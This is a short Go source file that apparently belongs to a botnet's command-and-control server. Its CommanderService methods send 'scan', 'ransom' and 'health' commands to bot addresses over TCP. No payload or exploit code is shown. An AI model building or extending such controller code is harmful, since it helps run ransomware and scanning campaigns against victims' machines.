package tcp

import (
	"github.com/rodzzlessa24/botnet"
)

//ScanCmd is
func (c *CommanderService) ScanCmd(addr string) error {
	return sendData(addr, commandToBytes("scan"))
}

//RansomCmd is
func (c *CommanderService) RansomCmd(addr string) error {
	return sendData(addr, commandToBytes("ransom"))
}

//CheckBotHealth is
func (c *CommanderService) CheckBotHealth(bot *botnet.Bot) error {
	return sendData(bot.Addr(), commandToBytes("health"))
}
